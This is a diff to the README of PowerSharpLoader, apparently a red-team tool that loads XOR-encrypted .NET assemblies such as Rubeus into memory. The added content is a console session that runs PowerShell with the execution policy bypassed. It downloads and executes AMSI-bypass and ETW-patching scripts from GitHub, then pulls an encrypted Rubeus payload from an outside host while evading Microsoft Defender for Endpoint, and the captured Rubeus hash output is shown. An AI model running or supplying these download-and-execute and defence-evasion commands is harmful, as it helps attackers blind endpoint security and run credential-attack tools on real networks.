@@ -149,7 +149,7 @@ Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/
 
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyXOR.ps1"));
-Invoke-LoadAssemblyXOR -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/rubeusxorb64.txt -Command "hash /password:test"
+Invoke-LoadAssemblyXOR -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/rubeusxorb64.txt -KeyString "enc_password_here" -Command "hash /password:test"
 
 ```
 
@@ -159,14 +159,14 @@ To generate the XOR encrypted Rubeus.exe from powershell on Kali Linux:
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/pwshxor.txt"));
 $path = "/var/www/html/test/Rubeus.exe";
 $EncodedData = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path));
-$enc_out = (xor $EncodedData "encrypt")
+$enc_out = (xor $EncodedData "encrypt" "enc_password_here")
 $enc_out > rubeusxorb64.txt
 ```
 
 For example:
 ```
 ┌──(root㉿average-student)-[/var/www/html/test]
-└─PS> Import-Module ./pwshxor.ps1
+└─PS> IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/pwshxor.txt"));
 
 ┌──(root㉿average-student)-[/var/www/html/test]
 └─PS> $path = "/var/www/html/test/Rubeus.exe";
@@ -175,9 +175,45 @@ For example:
 └─PS> $EncodedData = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($path));
 
 ┌──(root㉿average-student)-[/var/www/html/test]
-└─PS> $enc_out = (xor $EncodedData "encrypt")
+└─PS> $enc_out = (xor $EncodedData "encrypt" "enc_password_here")
 
 ┌──(root㉿average-student)-[/var/www/html/test]
 └─PS> $enc_out > rubeusxorb64.txt
 
+```
+
+Tested on a MDE bypassed SOE:
+```
+C:\Users\pentester>powershell -nop -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\pentester> IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi1_1.txt"));
+PS C:\Users\pentester> IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi2.txt"));
+True
+PS C:\Users\pentester> IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/etw.txt"));
+PS C:\Users\pentester> IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssemblyXOR.ps1"));
+PS C:\Users\pentester> Invoke-LoadAssemblyXOR -AssemblyUrl "https://test.1o1.st/test/rubeusxorb64meow.txt" -KeyString "meow_seckey_meow" -Command "hash /password:test"
+[Rubeus.Program]::Main($Command.Split(" "))
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.3
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : test
+[*]       rc4_hmac             : 0CB6948805F797BF2A82807973B89537
+
+[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
+
+PS C:\Users\pentester>
 ```
